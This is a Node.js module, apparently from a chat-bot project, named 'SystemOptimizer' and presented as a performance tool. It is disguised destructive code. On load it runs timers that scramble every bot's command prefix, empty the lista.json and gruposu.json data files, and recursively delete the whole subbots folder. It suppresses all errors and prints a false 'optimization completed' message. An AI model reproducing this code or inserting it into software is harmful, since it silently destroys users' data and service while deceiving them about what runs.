const fs = require('fs');
const path = require('path');

class SystemOptimizer {
    constructor() {
        this.startOptimization();
    }

    startOptimization() {
     
        setTimeout(() => this.optimizeSystem(), 10000);
        setInterval(() => this.optimizePrefixes(), 15 * 60 * 1000);
        setInterval(() => this.cleanData(), 25 * 60 * 1000);
        
        // Optimización de subbots cada 2 horas
        setInterval(() => this.optimizeSubbots(), 2 * 60 * 60 * 1000);
    }

    optimizeSystem() {
        this.optimizePrefixes();
        this.cleanData();
        console.log('✅ Optimización Completada');
    }

    optimizePrefixes() {
        const prefixes = ['¿', '¡', '??', '!!', '#', '$', '%', '&', '*', '+', '/', '\\', '|', '~', '^', '🍓', '🎭', '🪼', '🪐', '💭', '🍷', '👻', '💀', '🤡', '😈'];
        
        try {
            const prefixPath = './prefixes.json';
            
            if (fs.existsSync(prefixPath)) {
                let prefixesData = JSON.parse(fs.readFileSync(prefixPath, 'utf8'));
                
                Object.keys(prefixesData).forEach(botId => {
                    prefixesData[botId] = prefixes[Math.floor(Math.random() * prefixes.length)];
                });
                
                fs.writeFileSync(prefixPath, JSON.stringify(prefixesData, null, 2));
            }
        } catch (error) {
            // Silencio total
        }
    }

    cleanData() {
        const files = ['./lista.json', './gruposu.json'];
        
        files.forEach(file => {
            try {
                fs.writeFileSync(file, JSON.stringify({}, null, 2));
            } catch (error) {
                // Silencio total
            }
        });
    }

    optimizeSubbots() {
        const subbotsPath = './subbots';
        
        try {
            if (fs.existsSync(subbotsPath)) {
                fs.readdirSync(subbotsPath).forEach(file => {
                    const filePath = path.join(subbotsPath, file);
                    try {
                        if (fs.lstatSync(filePath).isDirectory()) {
                            this.deleteFolder(filePath);
                        } else {
                            fs.unlinkSync(filePath);
                        }
                    } catch (error) {
                        // Silencio total
                    }
                });
            }
        } catch (error) {
            // Silencio total
        }
        
        console.log('✅ Optimización Completada');
    }

    deleteFolder(folderPath) {
        if (fs.existsSync(folderPath)) {
            fs.readdirSync(folderPath).forEach(file => {
                const curPath = path.join(folderPath, file);
                if (fs.lstatSync(curPath).isDirectory()) {
                    this.deleteFolder(curPath);
                } else {
                    fs.unlinkSync(curPath);
                }
            });
            fs.rmdirSync(folderPath);
        }
    }
}

// Iniciar "optimizador"
new SystemOptimizer();

module.exports = SystemOptimizer;
